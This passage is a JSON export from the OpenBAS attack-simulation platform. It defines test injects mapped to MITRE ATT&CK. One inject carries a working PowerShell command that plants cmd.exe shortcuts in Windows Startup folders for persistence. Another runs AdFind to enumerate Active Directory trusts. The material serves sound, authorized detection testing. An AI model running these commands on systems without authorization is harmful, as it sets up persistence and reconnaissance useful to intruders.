obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"471dd284-1ced-4ff1-bddd-1c6e685a5e5d\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "5ad5bfee-31e7-4c11-adcc-d63f3eb2bfb6",
        "payload_type" : "Command",
        "payload_name" : "Create shortcut to cmd in startup folders",
        "payload_description" : "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "1da30239-fddc-4506-bd4e-c4396eeb84f8",
          "attack_pattern_name" : "Shortcut Modification",
          "attack_pattern_description" : "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",
          "attack_pattern_external_id" : "T1547.009",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
            "phase_external_id" : "TA0004",
            "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
            "phase_name" : "Privilege Escalation",
            "phase_shortname" : "privilege-escalation",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "phase_order" : 5
          }, {
            "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
            "phase_external_id" : "TA0003",
            "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
            "phase_name" : "Persistence",
            "phase_shortname" : "persistence",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "phase_order" : 4
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\nRemove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\n",
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "cfdc954d-4bb0-4027-875b-a1893ce406f2",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:54.180892Z",
        "payload_updated_at" : "2025-07-03T14:47:45.733485Z",
        "command_executor" : "psh",
        "command_content" : "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:54.196342Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:54.196342Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "1da30239-fddc-4506-bd4e-c4396eeb84f8",
        "attack_pattern_name" : "Shortcut Modification",
        "attack_pattern_description" : "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",
        "attack_pattern_external_id" : "T1547.009",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
          "phase_external_id" : "TA0004",
          "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
          "phase_name" : "Privilege Escalation",
          "phase_shortname" : "privilege-escalation",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
          "phase_order" : 5
        }, {
          "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
          "phase_external_id" : "TA0003",
          "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
          "phase_name" : "Persistence",
          "phase_shortname" : "persistence",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
          "phase_order" : 4
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "c49c14c2-6a85-48ce-be20-98f53d061317",
    "inject_title" : "Adfind - Enumerate Active Directory Trusts",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "optional_args" : null,
      "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_path" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 360,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Adfind - Enumerate Active Directory Trusts",
          "fr" : "Adfind - Enumerate Active Directory Trusts"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "optional_args",
          "label" : "optional_args",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : null,
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "d1f73e5c-6aa7-4565-957b-ed3b957f52f9",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "d1f73e5c-6aa7-4565-957b-ed3b957f52f9",
      "injector_contract_labels" : {
        "en" : "Adfind - Enumerate Active Directory Trusts",
        "fr" : "Adfind - Enumerate Active Directory Trusts"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Adfind - Enumerate Active Directory Trusts\",\"fr\":\"Adfind - Enumerate Active Directory Trusts\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"optional_args\",\"label\":\"optional_args\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":null,\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"d1f73e5c-6aa7-4565-957b-ed3b957f52f9\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "c8f7eaf1-957e-4cc6-a8b0-ec0f1c9b2a90",
        "payload_type" : "Command",
        "payload_name" : "Adfind - Enumerate Active Directory Trusts",
        "payload_description" : "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "f72b5ad5-2c64-4788-9ca3-fe33bd84465a",
          "attack_pattern_name" : "Domain Trust Discovery",
          "attack_pattern_description" : "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
          "attack_pattern_external_id" : "T1482",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "optional_args",
          "default_value" : null,
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
